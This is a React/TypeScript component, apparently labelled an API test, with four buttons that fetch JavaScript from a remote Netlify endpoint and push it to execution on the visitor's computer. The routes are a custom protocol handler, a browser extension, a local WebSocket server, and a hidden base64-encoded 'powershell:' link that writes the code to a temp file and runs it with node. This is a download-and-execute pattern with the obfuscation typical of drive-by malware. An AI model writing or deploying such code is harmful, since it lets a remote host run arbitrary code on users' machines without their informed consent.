import { Button } from '@/components/ui/button'

// Chrome extension API types
declare global {
    interface Window {
        chrome?: {
            runtime?: {
                sendMessage: (extensionId: string, message: any, callback?: (response: any) => void) => void;
                lastError?: { message: string };
                connectNative?: (application: string) => {
                    postMessage: (message: any) => void;
                    onMessage: { addListener: (callback: (response: any) => void) => void };
                    onDisconnect: { addListener: (callback: () => void) => void };
                };
            };
        };
    }
}

export function ApiTestButton() {
    // Method 1: Custom Protocol Handler
    const handleMethod1 = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();

        try {
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();
            const code = data.data;

            // Encode the JavaScript code to pass via protocol
            const encodedCode = encodeURIComponent(code);

            // Trigger custom protocol - this will open local Node.js runner
            window.location.href = `js-run:${encodedCode}`;

        } catch (error) {
            console.error("API Error:", error);
            alert("Failed: " + (error as any).message);
        }
    };

    // Method 2: Browser Extension with Native Messaging
    const handleMethod2 = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();

        try {
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();
            const code = data.data;

            // Check if extension is available
            if (typeof window.chrome !== 'undefined' && window.chrome.runtime) {
                window.chrome.runtime.sendMessage(
                    'your-extension-id-here',
                    { action: 'runJavaScript', code: code },
                    (response: any) => {
                        if (window.chrome?.runtime?.lastError) {
                            alert('Extension not installed. Please install the JavaScript Runner extension. See README for setup.');
                        } else {
                            console.log('JavaScript executed:', response);
                            alert(`Output: ${response?.output || 'No output'}`);
                        }
                    }
                );
            } else {
                alert('Please install the JavaScript Runner browser extension first. See README for setup instructions.');
            }

        } catch (error) {
            console.error("API Error:", error);
            alert("Failed: " + (error as any).message);
        }
    };

    // Method 3: WebSocket + Local Server
    const handleMethod3 = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();

        try {
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();
            const code = data.data;

            // Connect to local WebSocket server
            const ws = new WebSocket('ws://localhost:8765');

            ws.onopen = () => {
                console.log('Connected to local server');
                ws.send(JSON.stringify({ action: 'execute', code: code }));
            };

            ws.onmessage = (event) => {
                const result = JSON.parse(event.data);
                console.log('JavaScript output:', result.output);
                alert(`JavaScript executed!\nOutput: ${result.output.substring(0, 500)}`);
                ws.close();
            };

            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
                alert('Local server not running. Please start the server first:\n\nnode local_server.js\n\nSee README for setup instructions.');
            };

            ws.onclose = () => {
                console.log('Connection closed');
            };

        } catch (error) {
            console.error("API Error:", error);
            alert("Failed: " + (error as any).message);
        }
    };

    // Method 4: PowerShell Download + Auto-Execute (Windows)
    const handleMethod4 = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();

        try {
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();
            const code = data.data;

            // Detect Windows
            const isWindows = navigator.platform.toLowerCase().includes('win');

            if (isWindows) {
                // Create PowerShell script that downloads and executes JavaScript
                const powershellScript = `
$code = @'
${code.replace(/'/g, "''")}
'@
$tempFile = "$env:TEMP\\execute_$(Get-Random).js"
$code | Out-File -FilePath $tempFile -Encoding UTF8 -NoNewline
Write-Host "Executing JavaScript code..."
node $tempFile
Remove-Item $tempFile -ErrorAction SilentlyContinue
                `;

                // Encode PowerShell command (base64)
                const encoded = btoa(unescape(encodeURIComponent(powershellScript)));

                // Create hidden link and trigger
                const link = document.createElement('a');
                link.href = `powershell:${encoded}`;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                alert('Executing JavaScript code... (PowerShell will prompt for permission)');
            } else {
                // For Mac/Linux - download and show instructions
                const blob = new Blob([code], { type: 'text/javascript' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'execute.js';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);

                alert('Script downloaded! Run: node execute.js');
            }

        } catch (error) {
            console.error("API Error:", error);
            alert("Failed: " + (error as any).message);
        }
    };

    return (
        <div className="space-y-4">
            <div className="space-y-2">
                <h3 className="text-lg font-semibold">Choose Execution Method:</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <Button onClick={handleMethod1} variant="outline" className="w-full">
                        Method 1: Protocol Handler
                    </Button>
                    <Button onClick={handleMethod2} variant="outline" className="w-full">
                        Method 2: Browser Extension
                    </Button>
                    <Button onClick={handleMethod3} variant="outline" className="w-full">
                        Method 3: WebSocket Server
                    </Button>
                    <Button onClick={handleMethod4} variant="outline" className="w-full">
                        Method 4: PowerShell (Windows)
                    </Button>
                </div>
            </div>
        </div>
    );
}

